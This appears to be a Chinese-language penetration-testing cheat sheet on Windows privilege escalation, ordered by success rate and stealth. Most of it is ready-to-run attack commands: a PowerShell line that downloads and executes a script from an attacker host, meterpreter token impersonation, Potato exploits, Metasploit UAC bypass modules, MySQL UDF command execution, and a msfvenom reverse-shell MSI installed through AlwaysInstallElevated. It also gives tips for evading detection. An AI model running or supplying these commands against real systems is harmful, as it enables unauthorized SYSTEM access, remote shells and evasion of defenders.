# Windows 权限提升速查

> 按成功率+隐蔽性排序。先软后硬：配置错误→令牌→Potato→UAC→数据库→内核。

## 1. 服务权限配置错误（PowerUp）

```powershell
powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1');Invoke-AllChecks"
```
找到可写服务 → `Install-ServiceBinary -ServiceName <svc>` → 等服务重启。
检查文件权限：`icacls "C:\path\to\service.exe"` → F/M/W即可替换。

**Unquoted Service Path**：路径含空格且未加引号 → 插入同名exe截断执行。
```
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
# 找到 C:\Program Files\Some App\svc.exe → 放 C:\Program.exe 或 C:\Program Files\Some.exe
```

## 2. 令牌提权

```
whoami /priv    # 有SeImpersonatePrivilege → Potato系列
```
**incognito令牌窃取**（meterpreter已有session时）：
```
load incognito
list_tokens -u
impersonate_token "DOMAIN\\admin"
```

## 3. Potato 系列（服务账户→SYSTEM）

适用条件：IIS/MSSQL/服务账户等具有SeImpersonate权限的用户。

| 工具 | 适用 | 命令 |
|------|------|------|
| PrintSpoofer | Win10/Server2016-2019 | `PrintSpoofer.exe -i -c cmd` |
| GodPotato | 全版本通杀 | `GodPotato.exe -cmd "cmd /c whoami"` |
| SweetPotato | Win7-Win10/2008-2019 | `SweetPotato.exe -a cmd` |
| JuicyPotato | Win7-10/2008-2016(1809前) | `JuicyPotato.exe -l 1337 -p cmd.exe -t *` |

GodPotato优先（版本覆盖最广），PrintSpoofer次之。

## 4. UAC 绕过

前提：当前用户在管理员组，但被UAC拦截。
```
# MSF模块
exploit/windows/local/bypassuac_injection    # 内存注入，最隐蔽
exploit/windows/local/bypassuac_eventvwr     # 事件查看器劫持
exploit/windows/local/bypassuac              # 成功率较低，会落地文件
```
手动：通过fodhelper.exe/eventvwr.exe注册表劫持（适用Win10）。

## 5. MySQL UDF 提权

前提：MySQL root密码已知 + secure_file_priv为空。
```sql
show variables like '%plugin%';               -- 确认plugin目录
show variables like '%secure_file_priv%';     -- 必须为空
show variables like '%version_%';             -- 确认32/64位
```
MSF：`use exploit/multi/mysql/mysql_udf_payload` → 自动写入udf.dll并创建sys_exec函数。
手动：写入udf.dll到plugin目录 → `CREATE FUNCTION sys_eval RETURNS string SONAME 'udf.dll'` → `SELECT sys_eval('whoami')`。

## 6. AlwaysInstallElevated

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
两个都为1 → 任意MSI以SYSTEM权限安装：
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X LPORT=Y -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

## 7. 内核漏洞（最后手段）

检测：
```
systeminfo > sysinfo.txt
python wes.py sysinfo.txt -i "Elevation of Privilege" --exploits-only
```
工具：wesng (https://github.com/bitsadmin/wesng)、Kernelhub预编译exp。

## 注意事项
- 域环境优先考虑GPO/委派等域机制提权，比硬刚本地漏洞靠谱
- Win10 2023年后补丁基本封堵了老Potato，优先用GodPotato
- DLL劫持：找PATH中可写目录+服务依赖的DLL → 替换 → 等重启（利用条件苛刻，优先级低于上述方法）
- 能内存执行就别落地文件，用白名单程序（mshta/regsvr32）降低检测风险
- 权限够用就行，管理员够干活不必非要SYSTEM
